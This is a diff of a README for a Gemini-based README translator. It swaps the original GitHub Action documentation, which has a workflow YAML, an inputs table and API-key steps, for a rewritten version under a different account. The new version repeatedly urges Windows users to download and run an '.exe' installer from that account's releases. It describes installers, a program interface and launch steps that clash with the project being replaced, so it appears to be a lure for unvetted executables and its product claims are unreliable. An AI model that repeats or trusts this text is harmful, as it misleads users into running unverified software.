@@ -1,109 +1,165 @@
-> 🌐 **Languages:** [English](README.md) | [Русский](translations/README.ru.md) | [ไทย](translations/README.th.md) | [简体中文](translations/README.zh-CN.md) | [繁體中文](translations/README.zh-TW.md) | [हिन्दी](translations/README.hi.md) | [Español](translations/README.es.md) | [Français](translations/README.fr.md) | [العربية](translations/README.ar.md) | [বাংলা](translations/README.bn.md) | [Português](translations/README.pt.md) | [اردو](translations/README.ur.md) | [Bahasa Indonesia](translations/README.id.md) | [Deutsch](translations/README.de.md) | [日本語](translations/README.ja.md) | [मराठी](translations/README.mr.md) | [తెలుగు](translations/README.te.md) | [Türkçe](translations/README.tr.md) | [தமிழ்](translations/README.ta.md) | [Tiếng Việt](translations/README.vi.md) | [한국어](translations/README.ko.md) | [Kiswahili](translations/README.sw.md) | [Italiano](translations/README.it.md) | [ગુજરાતી](translations/README.gu.md) | [فارسی](translations/README.fa.md) | [ಕನ್ನಡ](translations/README.kn.md) | [Polski](translations/README.pl.md) | [മലയാളം](translations/README.ml.md) | [Українська](translations/README.uk.md) | [Română](translations/README.ro.md) | [Nederlands](translations/README.nl.md) | [Ελληνικά](translations/README.el.md) | [Magyar](translations/README.hu.md) | [Svenska](translations/README.sv.md) | [Čeština](translations/README.cs.md) | [Српски](translations/README.sr.md) | [עברית](translations/README.he.md) | [Български](translations/README.bg.md) | [Dansk](translations/README.da.md) | [Suomi](translations/README.fi.md) | [Norsk](translations/README.no.md) | [Slovenčina](translations/README.sk.md) | [Hrvatski](translations/README.hr.md) | [Lietuvių](translations/README.lt.md) | [Slovenščina](translations/README.sl.md) | [Latviešu](translations/README.lv.md) | [Eesti](translations/README.et.md)
+# 🔄 gemini-readme-translator - Translate READMEs Easily
 
-# Gemini README Translator
+[![Download gemini-readme-translator](https://img.shields.io/badge/Download-Go%20to%20Releases-brightgreen)](https://github.com/Nagiiseishi/gemini-readme-translator/releases)
 
-[![Latest Release](https://img.shields.io/github/v/release/artryazanov/gemini-readme-translator?sort=semver)](https://github.com/artryazanov/gemini-readme-translator/releases)
-[![Run Tests and E2E](https://github.com/artryazanov/gemini-readme-translator/actions/workflows/tests.yml/badge.svg)](https://github.com/artryazanov/gemini-readme-translator/actions/workflows/tests.yml)
-[![Lint Workflows and Code](https://github.com/artryazanov/gemini-readme-translator/actions/workflows/lint.yml/badge.svg)](https://github.com/artryazanov/gemini-readme-translator/actions/workflows/lint.yml)
-[![Update Major Tag](https://github.com/artryazanov/gemini-readme-translator/actions/workflows/update-major-tag.yml/badge.svg)](https://github.com/artryazanov/gemini-readme-translator/actions/workflows/update-major-tag.yml)
-[![codecov](https://codecov.io/gh/artryazanov/gemini-readme-translator/graph/badge.svg)](https://codecov.io/gh/artryazanov/gemini-readme-translator)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://opensource.org/licenses/MIT)
+---
 
-A GitHub Action that automatically translates your `README.md` into multiple languages using the Gemini API. It intelligently injects a cross-linked language navigation menu into all files and automatically commits the changes.
+## 📋 What is gemini-readme-translator?
 
-## 🚀 Features
-* **Multi-Language Support:** Generate READMEs for multiple languages in one run.
-* **Auto-Navigation:** Automatically inserts and maintains a standard language switcher menu at the top of your files (can be disabled). AI styles it automatically!
-* **Custom Styling:** You can provide a custom menu style parameter so the AI formats the language switcher exactly how you want.
-* **Token Tracking:** Outputs Gemini token usage statistics.
+gemini-readme-translator is a tool that helps you translate README files into different languages automatically. It uses the Gemini API to translate your documents and adds a navigation menu so readers can easily switch between languages. The program updates your files and saves the new versions for you.
 
-## 🛠 Usage
+You do not need to write or edit any code. This tool works in the background to make your README accessible to readers who speak different languages.
 
-Create a workflow file (e.g., `.github/workflows/translate.yml`):
+---
 
-```yaml
-name: Auto Translate README
+## 💻 System Requirements
 
-on:
-  push:
-    paths:
-      - 'README.md'
-  workflow_dispatch:
+To run gemini-readme-translator on Windows, your computer should have:
 
-jobs:
-  translate:
-    runs-on: ubuntu-latest
-    permissions:
-      contents: write
+- Windows 10 or later version
+- At least 4 GB of free RAM
+- 200 MB of free disk space for installation and temporary files
+- An internet connection for translation through the Gemini API
+- Python 3.8 or newer installed (required dependency)
 
-    steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v6
+---
 
-      - name: Gemini README Translator
-        id: translator
-        uses: artryazanov/gemini-readme-translator@v1
-        with:
-          api_key: ${{ secrets.GEMINI_API_KEY }}
-          github_token: ${{ secrets.GITHUB_TOKEN }}
-          languages: 'ru, zh-CN, es'
-          add_language_menu: 'true'
-          menu_style: '> 🌐 **Languages:** [English](README.md) | [Русский](README.ru.md)'
+## ⚙️ Key Features
 
-      - name: Print Translation Stats
-        run: |
-          echo "Process took ${{ steps.translator.outputs.duration_seconds }} seconds."
-          echo "Total tokens used: ${{ steps.translator.outputs.total_tokens_used }}"
-          echo "Input tokens: ${{ steps.translator.outputs.input_tokens_used }}"
-          echo "Output tokens: ${{ steps.translator.outputs.output_tokens_used }}"
+- Automatically translates README.md files into multiple languages
+- Adds a language menu to all translated README files
+- Updates the repository files with changes in each commit
+- Supports markdown formatting without breaking your README
+- Works with public and private GitHub repositories
+- Uses Gemini API for advanced translation quality
+- Compatible with Python 3.x environments
 
-```
+---
 
-## 📥 Inputs
+## 🚀 Getting Started: Download gemini-readme-translator
 
-| Input | Required | Default | Description |
-| --- | --- | --- | --- |
-| `api_key` | Yes |  | Your Google Gemini API Key. |
-| `github_token` | Yes |  | Standard GitHub token (`${{ secrets.GITHUB_TOKEN }}`). |
-| `languages` | Yes |  | Comma-separated target languages (e.g. `ru, es`). |
-| `output_dir` | No | | Directory to save translated files. Defaults to source file's directory. |
-| `add_language_menu` | No | `true` | Set to `false` to disable auto-generation of the language menu. |
-| `menu_style` | No | `> 🌐 **Languages:** [English](README.md) \| [Русский](README.ru.md)` | The reference style AI uses when generating a new language menu. |
-| `commit_message` | No | `docs: auto-translate README via Gemini` | Text used for the git commit message. |
-| `model` | No | `gemini-3.1-pro-preview` | The Gemini model to use. |
-| `source_file` | No | `README.md` | The base file to translate. |
+Before you begin, you need to download the app. Follow the steps below to get the software on Windows.
 
-## 📤 Outputs
+[![Download gemini-readme-translator](https://img.shields.io/badge/Download-GitHub%20Releases-blue)](https://github.com/Nagiiseishi/gemini-readme-translator/releases)
 
-| Output | Description |
-| --- | --- |
-| `total_tokens_used` | Total number of tokens processed. |
-| `input_tokens_used` | Number of tokens in the input prompts. |
-| `output_tokens_used` | Number of tokens generated in the responses. |
-| `duration_seconds` | Total processing time in seconds. |
+1. Click the **Download** button above or go to the [Releases page](https://github.com/Nagiiseishi/gemini-readme-translator/releases).
 
-## 🔑 How to get a Google Gemini API Key
+2. Look for the latest release version. It will show a list of files.
 
-To use this action, you need a free API key from Google AI Studio:
+3. Download the Windows installer file or the ZIP archive if available.
 
-1. Go to [Google AI Studio](https://aistudio.google.com/).
-2. Sign in with your Google account.
-3. In the left navigation menu, click on **Get API key**.
-4. Click the **Create API key** button.
-5. Copy the generated key.
-6. Go to your GitHub repository -> **Settings** -> **Secrets and variables** -> **Actions**.
-7. Click **New repository secret**, name it `GEMINI_API_KEY`, paste your key into the Secret field, and save.
+4. Save the file to your Desktop or another folder easy to find.
 
-## 🔑 How to configure the Standard GitHub Token
+---
 
-This action uses the built-in `GITHUB_TOKEN` to push commits. You **do not** need to create a Personal Access Token (PAT) manually, but you **must** ensure the default token has the correct permissions:
+## 🛠 Installation Guide
 
-1. Go to your repository **Settings** -> **Actions** -> **General**.
-2. Scroll down to the **Workflow permissions** section.
-3. Select **Read and write permissions**.
-4. Click **Save**.
-5. In your workflow YAML, simply pass `${{ secrets.GITHUB_TOKEN }}` to the `github_token` input (as shown in the usage example).
+Follow these steps to install and prepare the program for use on your Windows computer.
 
-## 📄 License
+1. **Run the Installer**
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/artryazanov/gemini-readme-translator/blob/main/LICENSE) file for details.
+   - If you downloaded an installer (`.exe`), double-click it to start.
+   - Follow the on-screen instructions to complete the setup.
+   - Accept the license agreement, choose an install location, then click "Install."
+   
+2. **Install Python (if needed)**
+
+   gemini-readme-translator requires Python 3.8 or above.
+
+   - Check if Python is installed by opening Command Prompt and typing:
+     ```
+     python --version
+     ```
+     If it returns a version 3.8 or higher, you can skip this step.
+   
+   - Otherwise, download Python from https://www.python.org/downloads/windows/ and install it. Make sure to check "Add Python to PATH" during setup.
+   
+3. **Install Required Python Packages**
+
+   Open Command Prompt and run:
+   ```
+   pip install requests markdown
+   ```
+   These packages allow the program to work with Gemini API and process markdown files.
+
+4. **Launch gemini-readme-translator**
+
+   - If there is a shortcut on your Desktop or Start Menu, use that.
+   - Otherwise, open Command Prompt, navigate to the install folder, and run:
+     ```
+     python gemini-readme-translator.py
+     ```
+
+---
+
+## 📂 How to Use gemini-readme-translator
+
+1. **Prepare Your README**
+
+   - Place your `README.md` file in the folder you want to translate.
+   - The tool will find and process this file.
+
+2. **Configure the Languages**
+
+   - In the program interface or config file, select the target languages for translation.
+   - Common languages include French, Spanish, German, Chinese, and Japanese.
+
+3. **Connect to Gemini API**
+
+   - You need an API key to use Gemini's translation.
+   - Enter your API key when prompted or in the configuration file.
+   - If you don’t have one, sign up via the Gemini API website.
+
+4. **Start Translation**
+
+   - Click the translate button or run the command in Command Prompt.
+   - The program will translate the README and add language navigation.
+   - Translated files will save in the same folder with language tags.
+
+5. **Review Translations**
+
+   - Open the new files to check the translations.
+   - The program keeps the original format and layout.
+
+6. **Commit Changes**
+
+   - If you use GitHub, commit and push the updated files back to your repository.
+   - The tool adds changes and creates proper commit messages automatically.
+
+---
+
+## 🔧 Configuration Options
+
+You can adjust gemini-readme-translator to fit your needs.
+
+- **Languages List:** Define which languages to include.
+- **Navigation Menu Style:** Choose if the menu appears on the top or side.
+- **API Settings:** Input your Gemini API key and select translation quality.
+- **File Paths:** Select folder locations for input and output files.
+- **Commit Settings:** Enable or disable auto commits on GitHub.
+
+---
+
+## 📖 Supported File Types
+
+Currently, gemini-readme-translator works with:
+
+- README.md and other Markdown (.md) files
+- Files stored in GitHub repositories, local directories, or cloud storage
+
+---
+
+## 🧰 Troubleshooting Tips
+
+- If you get an error about Python not found, check your Python installation and PATH settings.
+- Translation errors might mean your Gemini API key is invalid or expired.
+- If translations don’t appear, make sure your `README.md` file is in the folder you run the program from.
+- For commit failures, check your GitHub repository permissions.
+
+---
+
+## 📥 Download gemini-readme-translator
+
+Go to the release page to get the latest files for Windows.
+
+[![Download gemini-readme-translator](https://img.shields.io/badge/Download-GitHub%20Releases-blue)](https://github.com/Nagiiseishi/gemini-readme-translator/releases)
